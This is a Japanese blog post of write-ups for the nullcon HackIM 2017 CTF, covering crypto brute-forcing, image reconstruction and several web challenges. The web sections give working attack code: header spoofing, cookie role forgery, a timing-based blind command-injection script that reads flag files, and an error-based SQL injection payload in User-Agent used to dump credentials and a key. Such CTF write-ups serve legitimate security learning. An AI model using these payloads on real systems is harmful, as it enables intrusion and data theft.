---
layout: post
title: nullcon HackIM の write-up
categories: [ctf]
date: 2017-02-12 17:30:00 +0900
---

チーム Harekaze で [nullcon HackIM](http://ctf.nullcon.net/) に参加しました。

最終的にチームで 2150 点を獲得し、順位は 57 位 (得点 1544 チーム中) でした。うち、私は 9 問を解いて 2150 点を入れました。

以下、解いた問題の write-up です。

## [Programming 200] Programming Question 1

`(255, 255, 255), (255, 255, 255) …` という感じで延々色情報っぽいものが延々続くテキストファイルが渡されます。

`(` の個数を数えてみると `528601` でこの数は `569*929` です。幅が `929` 高さが `569` の画像を作ってみます。

```python
import re
from PIL import Image
w, h = 929, 569
s = open('abc.txt').read()
m = iter(re.findall(r'\((\d+), (\d+), (\d+)\)', s))
im = Image.new('RGB', (w, h))
for y in range(h):
  for x in range(w):
    r, g, b = next(m)
    im.putpixel((x, y), (int(r), int(g), int(b)))
im.show()
im.save('result.png')
```

[![実行結果](../images/2017-02-12_1.png)](../images/2017-02-12_1.png)

```
flag{Pil_PIL_PIL}
```

## [Crypto 350] Crypto Question 2

DH 鍵共有ですが、総当たりで大丈夫です。

```python
q, g = 541, 10
for a in range(1, 1000):
  for b in range(1, 1000):
    if pow(g, a, q) != 298:
      continue
    if pow(g, b, q) != 330:
      continue
    if pow(g, a * b, q) != 399:
      continue
    print(a, b)
```

```
flag{170,808}
```

## [Crypto 200] Crypto Question 3

同じく総当たりで。

```python
import os
import subprocess
NULL = open(os.devnull, 'w')
for x in range(100000):
  if x % 1000 == 0:
    print('{} / {}'.format(x, 100000))
  subprocess.call('openssl rsa -in HackIM.key -out 1{0:05d}.key -passin pass:1{0:05d}'.format(x), stderr=NULL, shell=True)
```

`cat message.new | openssl rsautl -decrypt -inkey 141525.key` でメッセージが復号できました。

```
Now that u r here. Go 2 the digit's page No.["password u found to decrpt the key"],
out of all Logos this Brand (case sensitive) has MD5 : 8c437d9ef6c7786e9df3ac2bf223445e
```

http://md5decryption.com/ に投げるとフラグが出ました。

```
flag{clearTax}
```

## [Misc 100] Misc1

難読化されたいろいろな言語のコードが詰め込まれたテキストファイルが渡されます。片っ端から実行していくと、aaencode された JavaScript のコードを実行したところでフラグが表示されました。

```
flag{flags_are_useless_in_real_world}
```

## [Web 100] Web1

ソースを見ると長い空行のあとに `<!-- MmI0YjAzN2ZkMWYzMDM3NWU1Y2Q4NzE0NDhiNWI5NWM= -->` というコメントがあります。base64 でデコードすると `2b4b037fd1f30375e5cd871448b5b95c`。これをググると Coldplay の Paradise という曲がヒットしました。

適当なユーザ名とパスワードでログインしようとすると `Mismatch in host table! Please contact your administrator for access. IP logged.` というエラーが表示されましたが、`X-Forwarded-For: 127.0.0.1` を付けるとこのエラーは表示されなくなりました。

いろいろ試して `curl -X POST --dump-header - http://54.152.19.210/web100/ --data "user=coldplay&pass=paradise" -H "X-Forwarded-For: 127.0.0.1" | grep -
v "^$"` でフラグが表示されました。えー…。

```
flag{4f9361b0302d4c2f2eb1fc308587dfd6}
```

## [Web 200] Web2

適当にログインして Cookie を見ると `u=351e76680323fb4d6f5201a5d6db30977ce5408757; r=351e766803d63c7ede8cb1e1c8db5e51c63fd47cff` となっています。共通している先頭 10 文字を削除して検索してみると、u の方はログインしているユーザ名、r の方は `limited` の md5 ハッシュと分かりました。

r を共通している先頭 10 文字 + md5(admin) に変えるとフラグが表示されました。

```
flag{bb6df1e39bd297a47ed0eeaea9cac7ee}
```

## [Web 300] Web3

何をすればいいのかよく分かりませんでしたが、[@megumish](https://twitter.com/megumish) さんが `curl -v -d "cmd=yes" http://54.89.146.217/` で裏で `yes` を実行しているようだというコメントをされてなるほど～という感じでした。

コマンドの実行結果を得たいのですが、curl や wget を使って外部に通信させることはできません。ということで sleep を使って少しずつ実行結果を手に入れましょう。

```python
import requests
import time

cmd = """
python -c "
import sys, time;
s = open('/home/nullcon/flagpart1.txt').read();
t = int(s.encode('hex')[{}], 16);
time.sleep(t);
sys.exit(0)
"
""".strip().replace('\n', '')

i = 0
while True:
  start = time.time()
  r = requests.post('http://54.89.146.217/', data={
    'cmd': cmd.format(i)
  })
  print(hex(int(time.time() - start)))
  i += 1
```

これでフラグの前半部分が得られました。`flagpart1.txt` を `flagpart2.txt` に変えると後半部分も得られました。

```
flag{0mgth4tsaniceflag}
```

## [Web 500] Web5

適当なユーザ名とパスワードでログインしようとすると `Your browser is not supported!` というエラーが表示されました。また、User-Agent を空にしてみると `Undefined index: HTTP_USER_AGENT in /var/www/html/web500/index.php on line 45` というエラーが表示されました。

User-Agent　を `'` にしてみると `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1` というエラーが表示されました。MySQL の Error-based SQLi ができそうです。

まず `' or updatexml(null,concat(0x3a,@@version),null);#` を試してみると、`XPATH syntax error: ':5.7.17-0ubuntu0.16.04.1'` と表示されました。やった!

続いて、information_schema.columns から次のような情報が得られました。

| table_name | column_name |
| ---------- | ----------- |
| accounts   | uid, uname, pwd, age, zipcode |
| cryptokey  | id, keyval, keyfor |
| useragents | bid, agent |

テーブルから内容を抜いていきます。

accounts。

| uname | pwd |
| ----- | --- |
| ori   | 6606a19f6345f8d6e998b69778cbf7ed |

cryptokey。

| keyfor | keyval |
| ------ | ------ |
| File Access | TheTormentofTantalus |

6606a19f6345f8d6e998b69778cbf7ed でググると `frettchen` の md5 ハッシュと分かりました。ユーザ名に `ori` パスワードに `frettchen` を入力するとログインができました。

URL を見ると、file パラメータに暗号化されている様子のファイル名が入っています。ログイン後のソースを見ると、

```
<!--

function decrypt($enc){
$key = ??; //stored elsewhere

$data = base64_decode($enc);
$iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));

$decrypted = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_128,hash('sha256', $key, true),substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),MCRYPT_MODE_CBC,$iv),"\0");

return $decrypted;
}

-->
```

とあります。これと先ほど抜いた鍵をもとに暗号化する関数を書きましょう。

```php
<?php
function encrypt($data, $iv) {
  $key = 'TheTormentofTantalus';
  $encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128,hash('sha256', $key, true),$data,MCRYPT_MODE_CBC,$iv);
  return base64_encode($iv . $encrypted);
}

$enc = 'uWN9aYRF42LJbElOcrtjrFL6omjCL4AnkcmSuszI7aA=';
$data = base64_decode($enc);
$iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
echo encrypt('flagflagflagflag', $iv) . "\n";
```

出てきた文字列を URL の file パラメータにセットするとフラグが表示されました。

```
flag{70031737753d9e53970531fc9475d6ef}
```

## [OSINT 200] OSINT2

<blockquote class="twitter-tweet" data-lang="ja"><p lang="de" dir="ltr"><a href="https://twitter.com/hashtag/HINT?src=hash">#HINT</a>:- OSINT200 1. Check RFC 7033 2. Check webfinger  <a href="https://twitter.com/hashtag/nullcon?src=hash">#nullcon</a> <a href="https://twitter.com/hashtag/hackIM?src=hash">#hackIM</a> <a href="https://twitter.com/hashtag/CTF?src=hash">#CTF</a></p>&mdash; nullcon (@nullcon) <a href="https://twitter.com/nullcon/status/830451424240734215">2017年2月11日</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

ということなので http://54.89.146.217/.well-known/webfinger にアクセスすると

```
SSDEEP(523bd1e47b08cfd4d92cddcbff8e541d)

flag{ssdeep}
```

とありました。523bd1e47b08cfd4d92cddcbff8e541d でググると https://vicheck.ca/report.php がヒットしたので https://vicheck.ca/md5query.php?hash=523bd1e47b08cfd4d92cddcbff8e541d にアクセスするとフラグが得られました。

```
flag{3072:uFvAPdnvdoz91j/q2p4N1m1QmKoEe2TE4lvrNh:uFvAPdnvdoz91rq2p4rm1QdoEe2TE4l/}
```

## 感想

[Web 400] Web4 を解けば Web は全完だったんですが、解けませんでした。つらい。
